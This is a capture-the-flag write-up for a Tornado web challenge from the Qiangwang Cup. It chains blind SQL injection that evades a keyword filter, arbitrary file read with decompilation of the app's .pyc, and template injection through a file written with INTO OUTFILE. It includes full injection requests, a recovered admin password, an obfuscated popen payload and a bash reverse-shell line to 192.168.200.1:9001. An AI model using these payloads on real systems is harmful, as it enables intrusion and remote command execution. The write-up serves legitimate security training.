### References

- ✨official - [@b1ind, 强网杯[pop_master]与[陀那多]赛题的出题记录, 2021-06-15](https://www.anquanke.com/post/id/244153#h2-4)

**Tag: SQL Injection, tornado SSTI**

1.SQL injection in `register.php`, `username` parameter, some fuzz show it filtered `#`,`--+`,`union`,`=`,`>`,`<`,`like`...

Most troublesome part is that the `table` and `column` key words unable to use. we can use the [file_instances](https://dev.mysql.com/doc/refman/5.7/en/performance-schema-file-instances-table.html) to get table name:

```sql
username=a' or if((ascii(mid((select file_name FROM performance_schema.file_instances limit 150,1),1,1)) in (47)),1,0) and '1&password=a
```

get file_name: `/var/lib/mysql/qwb/qwbtttaaab111e.frm`, so table name is `qwbtttaaab111e`

then we can get the table structure from the `DIGEST_TEXT` field in the [events_statements_summary_by_digest](https://dev.mysql.com/doc/refman/5.7/en/performance-schema-statement-summary-tables.html) table:

```sql
username=a' or if((ascii(mid((select DIGEST_TEXT FROM performance_schema.events_statements_summary_by_digest where SCHEMA_NAME in ('qwb') limit 1,1),1,1)) in (83)),1,0) and '1&password=a
```

get result is: 

```sql
SELECT * FROM `qwbtttaaab111e` WHERE `qwbqwbqwbuser` = ? AND `qwbqwbqwbpass` = ?
```

so column have `qwbqwbqwbuser` and `qwbqwbqwbpass`. and the username and password can then be obtained:

```sql
username=a' or if((ascii(mid((select group_concat(qwbqwbqwbuser,0x40,qwbqwbqwbpass) FROM qwbtttaaab111e),1,1)) in (97)),1,0) and '1&password=a
```

admin/we111c000me_to_qwb

> Or use the [processlist](https://dev.mysql.com/doc/refman/5.7/en/show-processlist.html) table to get the sql statement being executed, also possible to obtain table names and column names

2.After login we can see an image and glance at the path can aware of the possibility of arbitrary file reading

![](https://i.imgur.com/QpIX2LR.png)

The `flag` cannot be read directly here, also the `.py` file. By reading the `/proc/self/cmdline` can know that `/qwb/app/app.py` is running.

Since we can't read `.py` file, so just read the `.pyc` file and decompile it to get the source code. In response:

```tex
Server: TornadoServer/6.0.3
```

From [Tornado 6.0](https://www.tornadoweb.org/en/stable/releases/v6.0.0.html), the minimum supported Python version is 3.5.2. So here's a simple guess to get the file name:

```python
>>> import requests
>>> s = requests.session()
>>> s.get("http://192.168.200.129:8123/login.php?username=admin&password=we111c000me_to_qwb")
<Response [200]>

>>> res = s.get("http://192.168.200.129:8123/qwbimage.php?qwb_image_name=/qwb/app/__pycache__/app.cpython-35.pyc")
>>> with open('app.pyc', 'wb') as f:
...     f.write(res.content)
...
6717
```

then use [uncompyle6](https://github.com/rocky/python-uncompyle6) to decompile it:

```bash
$ uncompyle6 app.pyc > app.py
```

3.In the `/good_job_my_ctfer.php` route, there is a SSTI, but the filtering is very strict:

```python
black_func = ['eval', 'os', 'chr', 'class', 'compile', 'dir', 'exec', 'filter', 'attr', 'globals', 'help', 'input', 'local', 'memoryview', 'open', 'print', 'property', 'reload', 'object', 'reduce', 'repr', 'method', 'super', 'vars']
black_symbol = ["__", "'", '"', "$", "*", '{{']
black_keyword = ['or', 'and', 'while']
black_rce = ['render', 'module', 'include', 'raw']
```

Basically all dangerous operations are filtered, even `{{`. In addition to `{{}}`, the tornado framework also supports `{%%}`.

In [template.py](https://github.com/tornadoweb/tornado/blob/branch6.0/tornado/template.py#L142), we can find some useful operations such as `extends`. Its parameter is a file name which will be included as a template file and rendered.

So if we have a file that contains a string with a malicious SSTI payload, then it is possible to execute that SSTI payload.

In the previous arbitrary file read, the `/proc/self/environ` show that the python application started with mysql user privileges:

```tex
USER=mysql
```

So we can write file through mysql `into outfile` statement, and the default export directory is `/var/lib/mysql-files/`:

```sql
mysql> show variables like '%secure%';
+--------------------------+-----------------------+
| Variable_name            | Value                 |
+--------------------------+-----------------------+
| require_secure_transport | OFF                   |
| secure_auth              | ON                    |
| secure_file_priv         | /var/lib/mysql-files/ |
+--------------------------+-----------------------+
3 rows in set (0.01 sec)
```

4.First, write the payload to the database via sql injection:

```sql
/register.php?username=1&password={%set return __import__("os").popen("bash -c 'exec bash -i &>/dev/tcp/192.168.200.1/9001 <&1'")%}
```

into outfile

```sql
/register.php?username=1' into outfile '/var/lib/mysql-files/poc&password=1
```

Access to the corresponding route

```tex
/good_job_my_ctfer.php?congratulations={%25extends /var/lib/mysql-files/poc%25}
```

![](https://i.imgur.com/Lg7lnpC.png)

or

```sql
/register.php?username=1&password={{__import__(bytes.fromhex(str(hex(28531))[2:]).decode()).popen(bytes.fromhex(str(hex(279323744747812617481883710182392676816225436916761124444248150169258234324703143999506458696587503470271774501806956671608953577550119))[2:]).decode())}}
```

